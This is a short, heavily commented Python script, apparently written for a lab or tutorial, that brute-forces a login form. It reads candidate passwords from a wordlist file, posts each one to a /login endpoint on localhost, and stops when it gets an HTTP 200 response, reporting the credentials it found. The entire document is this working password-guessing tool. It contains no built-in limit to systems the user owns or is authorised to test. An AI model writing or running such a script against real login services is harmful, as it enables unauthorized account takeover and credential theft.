import http.client
from http import HTTPStatus
import sys

# Target server configuration
HOST = "localhost"
PORT = 8080

# --- OUTER SHIELD: File System & Manual Interruptions ---
try:
    # Utilizing a context manager for safe and efficient file handling
    with open("passwords.txt", "r", encoding="utf-8") as file:
        
        # Iterate through the wordlist sequentially
        for line in file:
            
            # Sanitize the payload by stripping hidden characters (e.g., \n)
            payload = line.strip()
            
            # Skip empty lines to optimize network requests
            if not payload:
                continue

            print(f"[*] Testing payload: {payload}")
            
            # --- INNER SHIELD: Network & Connection Handling ---
            connection = None # Initialized here to ensure scope for the 'finally' block

            try:
                # Establish TCP connection with a strict timeout to prevent hanging
                connection = http.client.HTTPConnection(HOST, PORT, timeout=5)
                
                # Formulate and transmit the HTTP POST request
                connection.request("POST", "/login", body=payload)
                response = connection.getresponse()

                # Evaluate HTTP status code for successful authentication
                if response.status == HTTPStatus.OK:
                    print(f"[+] Success! Valid credentials found: {payload}")
                    break

                else:
                    print(f"[-] Failed. Server responded with HTTP {response.status}\n")
            
            # Handle target unavailability (e.g., server offline)
            except ConnectionRefusedError:
                print("[!] Critical Error: Target server is offline or refusing connections. Aborting.")
                break
                
            # Handle network latency or dropped packets
            except TimeoutError:
                print(f"[!] Warning: Connection timed out for payload '{payload}'. Skipping.")
                continue 
            
            # Catch-all for unexpected network exceptions during the request
            except Exception as e:
                print(f"[!] Unexpected network error occurred: {e}")
                break
            
            # Guaranteed resource cleanup to prevent socket leaks
            finally:
                if connection:
                    connection.close()

# Handle missing, renamed, or inaccessible wordlists
except FileNotFoundError:
    print("[!] Critical Error: Wordlist 'passwords.txt' not found. Verify file path.")

# Handle graceful manual termination by the operator
except KeyboardInterrupt:
    print("\n[!] Operation aborted manually by user (Ctrl+C).")

# Final safety net for unforeseen system errors
except Exception as e:
    print(f"[!] A critical system error occurred: {e}")
